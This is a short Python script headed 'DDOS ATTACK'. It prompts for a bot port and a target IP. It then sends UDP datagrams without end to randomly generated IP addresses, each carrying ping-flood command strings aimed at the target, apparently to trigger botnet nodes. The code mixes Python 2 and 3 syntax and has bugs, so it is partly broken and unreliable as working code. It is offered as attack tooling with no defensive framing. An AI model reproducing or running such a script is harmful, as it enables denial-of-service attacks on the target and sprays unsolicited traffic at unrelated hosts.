import sys
import os
import time
import socket
import random
from time import sleep


##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#############
print("                        >>>DDOS ATTACK<<<")
print("")
print("===================================================================")
print ""
print ""
ip = str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255))
port = input("BOT Port  z.b: 1001 , 135     : ")
t = raw_input(("TARGET ip : "))
sent = 0
while True:
     try:
         ip = str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255))

         sock.sendto('os.system(f"ping -c 1000000000 -s 200 {%s}")'%(t) , (ip,port))
         sock.sendto('ping -c 100000000 -s 200 {%s}'%(t) , (ip,port))
         sock.sendto('ping -s 200 {%s}'%(t) , (ip,port))
         sent = sent + 1
     
         print "Sent %s pkgs ||| sent pkg to %s port:%s"%(sent,ip,port,)

     except:
          print("ERROR")

